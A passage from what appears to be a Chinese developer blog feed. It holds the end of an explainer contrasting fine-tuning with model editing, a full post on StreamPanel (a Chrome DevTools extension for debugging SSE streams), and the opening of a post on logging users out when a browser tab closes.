<li>Prefix Tuning</li>
</ul>
<p>特点：</p>
<ul>
<li>
<p>不改模型结构</p>
</li>
<li>
<p>训练的是：</p>
<ul>
<li>虚拟 prompt</li>
<li>注意力里的偏置</li>
</ul>
</li>
</ul>
<p>本质：</p>
<blockquote>
<p><strong>通过“怎么喂给模型输入”来影响整体行为</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-13">4️⃣ 参数微调的本质特征（总结）</h3>
<ul>
<li>✅ 一定有 loss</li>
<li>✅ 在数据分布上优化</li>
<li>✅ 多步训练、追求收敛</li>
<li>❌ 不保证只改某一条具体知识</li>
</ul>
<hr/>
<h2 data-id="heading-14">四、什么是模型编辑（Model Editing）？</h2>
<h3 data-id="heading-15">1️⃣ 一句话直观理解</h3>
<blockquote>
<p><strong>模型编辑 = 不重新训练模型，只修正它“某个具体问答”的结果</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-16">2️⃣ 模型编辑解决的是什么问题？</h3>
<p>典型问题形式是：</p>
<blockquote>
<p>“当模型被问到 X 时，<br/>
它以后应该回答 Y，而不是原来的 Z。”</p>
</blockquote>
<p>注意：</p>
<ul>
<li>只关心<strong>这一条或少数几条输入输出</strong></li>
<li>不关心整体分布性能是否提升</li>
</ul>
<hr/>
<h3 data-id="heading-17">3️⃣ 模型编辑是怎么做到的？（直觉版）</h3>
<p>核心目标只有三个：</p>
<ol>
<li><strong>这条问答一定要改对（Edit Success）</strong></li>
<li><strong>别影响无关问题（Locality）</strong></li>
<li><strong>改动尽量小（Minimal Change）</strong></li>
</ol>
<p>所以模型编辑不是在“训练模型”，而是在：</p>
<blockquote>
<p><strong>解一个“最小改动、满足约束”的问题</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-18">4️⃣ 模型编辑有没有 loss？</h3>
<p><strong>有，但和微调完全不同。</strong></p>
<ul>
<li>
<p>微调：</p>
<ul>
<li>loss 用来让模型“整体越来越好”</li>
<li>追求收敛</li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>
<p>loss 只是用来判断：</p>
<ul>
<li>“这条指定问答对不对？”</li>
</ul>
</li>
<li>
<p><strong>一旦满足就停止</strong></p>
</li>
</ul>
</li>
</ul>
<p>👉 <strong>不是训练，而是一次性修复</strong></p>
<hr/>
<h3 data-id="heading-19">5️⃣ 模型编辑的三种典型实现思路（不深入算法）</h3>
<h4 data-id="heading-20">（1）直接改模型内部参数</h4>
<ul>
<li>找到与该知识最相关的层</li>
<li>做非常小的数值修改</li>
</ul>
<p>可以理解为：</p>
<blockquote>
<p>“精准地拧了一下某个螺丝”</p>
</blockquote>
<hr/>
<h4 data-id="heading-21">（2）基于单样本的极少步优化</h4>
<ul>
<li>只用一条问答</li>
<li>加强“不要影响别的地方”的约束</li>
<li>优化 1～几步就停</li>
</ul>
<hr/>
<h4 data-id="heading-22">（3）外接补丁 / 记忆 / 路由</h4>
<ul>
<li>
<p>不直接改主模型</p>
</li>
<li>
<p>遇到特定问题时：</p>
<ul>
<li>走“修正通道”</li>
</ul>
</li>
</ul>
<p>更像是：</p>
<blockquote>
<p>“打补丁而不是重编程序”</p>
</blockquote>
<hr/>
<h2 data-id="heading-23">五、为什么模型编辑不能简单看成“一种微调”？</h2>
<p>这是一个非常容易混淆的点。</p>
<p>关键区别在于：</p>
<h3 data-id="heading-24">1️⃣ 优化目标不同</h3>
<ul>
<li>
<p>参数微调：</p>
<ul>
<li>优化的是 <strong>平均表现</strong></li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>满足的是 <strong>明确约束</strong></li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-25">2️⃣ 时间尺度不同</h3>
<ul>
<li>微调：分钟 / 小时</li>
<li>模型编辑：秒级</li>
</ul>
<hr/>
<h3 data-id="heading-26">3️⃣ 可逆性不同</h3>
<ul>
<li>
<p>微调：</p>
<ul>
<li>改了就很难回滚</li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>通常可以撤销某一次修改</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-27">六、最终对照总结表</h2>








































<table><thead><tr><th>维度</th><th>参数微调</th><th>模型编辑</th></tr></thead><tbody><tr><td>修改对象</td><td>行为分布</td><td>具体知识点</td></tr><tr><td>是否训练</td><td>是</td><td>否（或极少步）</td></tr><tr><td>是否追求收敛</td><td>是</td><td>否</td></tr><tr><td>是否用 loss</td><td>是</td><td>是（但仅作约束）</td></tr><tr><td>影响范围</td><td>全局</td><td>局部</td></tr><tr><td>典型用途</td><td>新任务 / 新领域</td><td>修错 / 更新事实</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-28">七、一句话终极总结</h2>
<blockquote>
<p><strong>参数微调是在“教模型学新东西”</strong><br/>
<strong>模型编辑是在“纠正模型已经学错的某一句话”</strong></p>
</blockquote>
<p>如果你理解了这一点，后面的所有技术差异，都会变得非常自然。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件]]></title>    <link>https://juejin.cn/post/7584243498527211520</link>    <guid>https://juejin.cn/post/7584243498527211520</guid>    <pubDate>2025-12-16T07:14:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527211520" data-draft-id="7584013833993846818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件"/> <meta itemprop="keywords" content="前端,后端,HTTP"/> <meta itemprop="datePublished" content="2025-12-16T07:14:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="喵爸的小作坊"/> <meta itemprop="url" content="https://juejin.cn/user/1679709495365405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1679709495365405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    喵爸的小作坊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:14:18.000Z" title="Tue Dec 16 2025 07:14:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件</h2>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2d1fe8cc3e483889cc40700b880ab9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=B33cTZOGE0VxBzYklYKsCWCsKSU%3D" alt="z-image_00006_" loading="lazy"/>
<blockquote>
<p>当 Chrome 开发者工具的 Network 面板无法满足你的 SSE 调试需求时，我们选择自己动手做一个。</p>
</blockquote>
<h3 data-id="heading-1">故事的开始</h3>
<p>在开发 AI 应用平台的过程中，我们经常需要调试 Server-Sent Events (SSE) 连接。Chrome 开发者工具虽然强大，但在查看 SSE 报文方面确实有些力不从心：</p>
<ul>
<li>Network 面板中的 EventStream 查看体验不够友好</li>
<li>无法方便地查看 iframe 中的 SSE 连接</li>
<li>缺少针对流式数据的筛选和搜索功能</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79c2da261b4e41358be7ca48b6649a6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=bRndK4i7SYUvjOAVDi5rFwGwEV8%3D" alt="z-image_00007_" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/640290f55b204e5c9b82fd0e0145ac11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=Q%2B%2B0y2NAr4WaiiR%2FMtYNWBWLe5Y%3D" alt="z-image_00008_" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77283396ac234187bbbe9eaabe28b1f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=1AJICQDszdy712Ej1p%2B2Vn8Jihk%3D" alt="z-image_00009_" loading="lazy"/></p>
<h3 data-id="heading-2">StreamPanel 是什么</h3>
<p>StreamPanel 是一个 Chrome DevTools 扩展，专门用于监控和调试流式请求。它能够：</p>
<ul>
<li>🔍 <strong>实时监控</strong>：拦截并显示所有 EventSource 和基于 Fetch 的 SSE 连接</li>
<li>📊 <strong>消息检查</strong>：查看详细的消息数据，支持 JSON 语法高亮</li>
<li>🔗 <strong>连接管理</strong>：同时跟踪多个流式连接，包括主页面和 iframe</li>
<li>🎯 <strong>URL 过滤</strong>：按 URL 过滤连接，快速定位目标端点</li>
<li>🔎 <strong>消息筛选</strong>：根据 JSON 字段值进行筛选（支持全等和包含两种模式）</li>
<li>🌓 <strong>深色模式</strong>：自动适配系统主题</li>
</ul>
<h3 data-id="heading-3">安装方法</h3>
<h4 data-id="heading-4">1. 获取源码</h4>
<p>首先，你需要获取 StreamPanel 的源码。可以通过以下方式：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/bywwcnll/StreamPanel.git
<span class="hljs-built_in">cd</span> StreamPanel
</code></pre>
<p>或者直接下载 ZIP 文件并解压。</p>
<h4 data-id="heading-5">2. 加载到 Chrome</h4>
<ol>
<li>打开 Chrome 浏览器，访问 <code>chrome://extensions/</code></li>
<li>在右上角开启<strong>开发者模式</strong>（Developer mode）</li>
<li>点击<strong>加载已解压的扩展程序</strong>（Load unpacked）</li>
<li>选择 StreamPanel 项目目录</li>
<li>完成！插件已安装</li>
</ol>
<h4 data-id="heading-6">3. 验证安装</h4>
<p>安装成功后，你应该能在扩展程序列表中看到 StreamPanel。打开任意网页的开发者工具（F12），应该能看到一个新的 <strong>Stream Panel</strong> 标签页。</p>
<h3 data-id="heading-7">使用方法</h3>
<h4 data-id="heading-8">基本使用</h4>
<ol>
<li>
<p><strong>打开开发者工具</strong></p>
<ul>
<li>按 <code>F12</code> 或右键选择"检查"</li>
<li>切换到 <strong>Stream Panel</strong> 标签页</li>
</ul>
</li>
<li>
<p><strong>查看连接</strong></p>
<ul>
<li>左侧面板会显示所有检测到的流式连接</li>
<li>每个连接显示 URL、状态、消息数量等信息</li>
<li>连接按创建时间倒序排列，最新的在最上面</li>
</ul>
</li>
<li>
<p><strong>查看消息</strong></p>
<ul>
<li>点击左侧的连接，右侧会显示该连接的所有消息</li>
<li>消息以表格形式展示：ID、类型、数据、时间</li>
<li>点击任意消息可查看详细的 JSON 内容</li>
</ul>
</li>
</ol>
<h4 data-id="heading-9">高级功能</h4>
<h5 data-id="heading-10">URL 过滤</h5>
<p>在顶部工具栏的输入框中输入 URL 关键词，可以快速过滤连接列表。</p>
<h5 data-id="heading-11">消息筛选</h5>
<p>这是 StreamPanel 的核心功能之一，特别适合处理大量消息的场景：</p>
<ol>
<li>点击右上角的<strong>筛选</strong>按钮，显示筛选面板</li>
<li>点击<strong>添加筛选条件</strong></li>
<li>配置筛选条件：
<ul>
<li><strong>字段</strong>：从下拉列表中选择要筛选的 JSON 字段（自动提取所有可用字段）</li>
<li><strong>匹配模式</strong>：选择"全等"或"包含"</li>
<li><strong>筛选值</strong>：输入要匹配的值</li>
</ul>
</li>
<li>可以添加多个筛选条件，使用 AND 逻辑</li>
<li>点击<strong>应用筛选</strong>按钮生效</li>
</ol>
<p><strong>示例场景</strong>：</p>
<p>假设你的 SSE 消息格式如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"event"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"message"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"conversation_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"c8f8a2ec-d046-4fcb-84d4-55b42308f68d"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fe50c43f-e4b7-4f9d-be73-87cf20ca738f"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"answer"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"饮酒"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你可以：</p>
<ul>
<li>筛选 <code>event</code> 字段等于 <code>"message"</code> 的消息</li>
<li>筛选 <code>conversation_id</code> 包含 <code>"c8f8"</code> 的消息</li>
<li>同时应用多个条件，比如：<code>event</code> 等于 <code>"message"</code> <strong>且</strong> <code>answer</code> 包含 <code>"酒"</code></li>
</ul>
<h5 data-id="heading-12">支持嵌套字段</h5>
<p>StreamPanel 支持使用点号表示法访问嵌套的 JSON 字段，例如：<code>user.profile.name</code></p>
<h3 data-id="heading-13">技术实现</h3>
<p>StreamPanel 的核心是拦截浏览器的 EventSource 和 Fetch API，实现原理如下：</p>
<pre><code class="hljs language-scss" lang="scss">网页
  └── inject<span class="hljs-selector-class">.js</span> (拦截 EventSource/fetch)
      └── <span class="hljs-attribute">content</span><span class="hljs-selector-class">.js</span> (消息桥梁)
          └── <span class="hljs-attribute">background</span><span class="hljs-selector-class">.js</span> (数据存储)
              └── devtools/panel (UI 显示)
</code></pre>
<h4 data-id="heading-14">关键组件</h4>
<ol>
<li><strong>inject.js</strong>：注入到网页中，拦截 <code>EventSource</code> 构造函数和 <code>fetch</code> API</li>
<li><strong>content.js</strong>：作为注入脚本和后台脚本之间的消息桥梁</li>
<li><strong>background.js</strong>：管理数据存储，处理标签页间的通信</li>
<li><strong>devtools/panel</strong>：在 Chrome DevTools 中显示的 UI 面板</li>
</ol>
<h4 data-id="heading-15">筛选功能实现</h4>
<p>消息筛选功能的核心是：</p>
<ul>
<li>递归提取 JSON 数据中的所有字段（包括嵌套字段）</li>
<li>支持点号表示法访问嵌套属性</li>
<li>使用防抖优化，避免频繁重渲染</li>
<li>分离"待应用"和"已应用"的筛选条件，提供更好的交互体验</li>
</ul>
<h3 data-id="heading-16">使用场景</h3>
<p>StreamPanel 特别适合以下场景：</p>
<ul>
<li><strong>AI 应用开发</strong>：调试 LLM 流式响应</li>
<li><strong>实时数据监控</strong>：查看 WebSocket/SSE 推送的数据</li>
<li><strong>API 调试</strong>：分析流式接口的返回内容</li>
<li><strong>多 iframe 场景</strong>：同时监控主页面和 iframe 中的连接</li>
</ul>
<h3 data-id="heading-17">总结</h3>
<p>StreamPanel 的诞生源于实际开发中的痛点。通过 AI 辅助开发，我们快速实现了一个功能完善的 Chrome 插件，不仅解决了自己的问题，也希望能帮助到更多开发者。</p>
<p>如果你也在为 SSE 调试而烦恼，不妨试试 StreamPanel。项目已开源，欢迎使用和贡献！</p>
<hr/>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbywwcnll%2FStreamPanel" target="_blank" title="https://github.com/bywwcnll/StreamPanel" ref="nofollow noopener noreferrer">GitHub Repository</a></p>
<p><strong>问题反馈</strong>：欢迎提交 Issue 或 Pull Request</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浏览器及标签页关闭时登出的解决方案]]></title>    <link>https://juejin.cn/post/7584057497206063147</link>    <guid>https://juejin.cn/post/7584057497206063147</guid>    <pubDate>2025-12-16T07:19:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497206063147" data-draft-id="7584061465398296617" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浏览器及标签页关闭时登出的解决方案"/> <meta itemprop="keywords" content="前端,浏览器"/> <meta itemprop="datePublished" content="2025-12-16T07:19:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码农胖大海"/> <meta itemprop="url" content="https://juejin.cn/user/4195392102086967"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浏览器及标签页关闭时登出的解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4195392102086967/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码农胖大海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:19:12.000Z" title="Tue Dec 16 2025 07:19:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>项目出于安全评测的要求，需要页面在浏览器及其标签页关闭的时候登出，保证每次进入系统都重新登录。
核心处理逻辑有如下几点：</p>
<ol>
<li>监听浏览器关闭事件</li>
<li>关闭时清除本地存储的token</li>
<li>关闭时调用登出接口保证后端redis中token被清除</li>
</ol>
<p>通过AI和网络搜索 给出的方案，很快就实现了。但在自测验证过程中，发现有两个费劲周折的问题。</p>
<ol>
